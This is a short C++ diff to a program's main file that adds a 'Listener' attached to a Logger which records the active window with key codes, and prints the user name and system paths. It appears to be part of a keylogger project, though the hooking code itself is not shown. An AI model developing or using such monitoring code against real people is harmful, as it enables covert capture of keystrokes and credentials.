@@ -2,15 +2,16 @@
 // all .cpp files must
 
 #include "pch.h"
-#include "Logger.h"
+#include "Listener.h"
 #include <iostream>
 
 using namespace std;
 
 int main()
 {
-	// Start Logger instance
+	// Start logger and listener
 	Logger logger;
+	Listener listener(&logger);
 
 	// Add 2 dummy log to logger
 	logger.Add(Utilities::GetActiveWindow(), VK_ESCAPE);
@@ -21,6 +22,9 @@ int main()
 	cout << Utilities::GetUsername() << endl;
     cout << Utilities::GetProgramFilePath() << endl;
 	cout << Utilities::GetSystemDir() << endl;
+
+	// Start listening
+	listener.Start();
 
 	// Display logger content
 	cout << logger.GetLog() << endl;
